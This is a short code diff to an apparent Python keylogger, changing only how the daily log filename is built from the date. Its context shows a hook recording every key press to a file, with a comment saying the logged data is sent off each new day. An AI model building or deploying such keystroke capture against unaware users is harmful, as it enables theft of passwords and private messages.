@@ -17,7 +17,8 @@ def listen_keyboard():
     # We will create files for each day,
     # resume the logging within the same file,
     # and sending all the data when a new day is detected
-    filename = f"keylog_{get_actual_date()}.txt"
+    ACTUAL_DATE = get_actual_date()
+    filename = f"keylog_{ACTUAL_DATE}.txt"
     
     log_key_callback = partial(__log_key, filename=filename)
     keyboard.on_press(log_key_callback)
